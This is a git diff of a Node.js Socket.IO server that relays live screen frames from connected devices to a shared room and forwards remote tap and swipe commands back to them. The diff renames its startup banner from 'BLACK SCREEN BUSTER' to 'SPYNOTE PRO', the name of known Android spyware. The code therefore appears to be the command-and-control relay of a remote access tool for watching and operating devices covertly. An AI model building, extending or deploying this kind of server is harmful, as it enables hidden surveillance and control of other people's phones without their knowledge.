@@ -13,18 +13,18 @@ const io = socketIo(server, {
     maxHttpBufferSize: 200e6
 });
 
-// 🔥 STATIC FILES - Render.com ke liye
+// 🔥 STATIC FILES + INDEX.HTM SERVING
 app.use(compression());
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json({ limit: '200mb' }));
 app.use(express.urlencoded({ limit: '200mb', extended: true }));
 
-// 🔥 INDEX.HTML SERVE - Render.com fix
+// 🔥 ROOT ROUTE - INDEX.HTM LOAD
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// 🔥 CATCH ALL - SPA routing
+// 🔥 ALL ROUTES - SPA
 app.get('*', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
@@ -51,19 +51,19 @@ io.on('connection', (socket) => {
         io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.entries()));
     });
 
-    // 🔥 FRAME + LAYOUT - FIXED
+    // 🔥 SCREEN + LAYOUT STREAM
     socket.on('screen-frame', (frameData) => {
         const deviceId = frameData.deviceId;
         if (devices.has(deviceId)) {
             devices.set(deviceId, { ...devices.get(deviceId), lastSeen: Date.now() });
-            
             io.to(GLOBAL_ROOM).emit('screen-frame', frameData);
             socket.to(`device_${deviceId}`).emit('screen-frame', frameData);
         }
     });
 
+    // 🔥 REMOTE CONTROL
     socket.on('control', (controlData) => {
-        const { deviceId, action, x, y } = controlData;
+        const { deviceId, action, x, y, startX, startY, endX, endY, dx, dy } = controlData;
         if (devices.has(deviceId)) {
             console.log(`🎮 ${action.toUpperCase()} ${deviceId.slice(0,8)} (${x?.toFixed(0)},${y?.toFixed(0)})`);
             socket.to(`device_${deviceId}`).emit('control', controlData);
@@ -75,7 +75,7 @@ io.on('connection', (socket) => {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
                 io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.entries()));
-                console.log(`❌ DISCONNECTED: ${deviceId.slice(0,12)}`);
+                console.log(`❌ OFFLINE: ${deviceId.slice(0,12)}`);
                 break;
             }
         }
@@ -93,6 +93,6 @@ setInterval(() => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`\n🎯 BLACK SCREEN BUSTER LIVE! PORT ${PORT}`);
+    console.log(`\n🎯 SPYNOTE PRO LIVE! PORT ${PORT}`);
     console.log(`🌐 https://your-app.onrender.com\n`);
 });
